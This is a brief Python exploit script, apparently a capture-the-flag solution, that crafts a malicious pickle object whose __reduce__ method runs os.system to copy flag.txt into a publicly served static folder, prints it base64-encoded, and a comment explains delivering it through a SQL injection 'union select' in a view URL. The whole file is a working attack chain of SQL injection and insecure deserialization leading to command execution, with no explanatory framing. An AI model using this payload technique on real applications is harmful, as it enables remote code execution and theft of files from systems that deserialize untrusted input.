import pickle
import base64
import os

class Item:
	def __reduce__(self):
		cmd = ('cat flag.txt >> app/static/images/flag.txt')
		return os.system,(cmd,)
if __name__ == '__main__':
	print(base64.urlsafe_b64encode(pickle.dumps(Item())).decode('ascii'))

#use the sqli to load the base64 encoded pickle payload: "url/view/'union select {base64_encoded_payload}  "
 
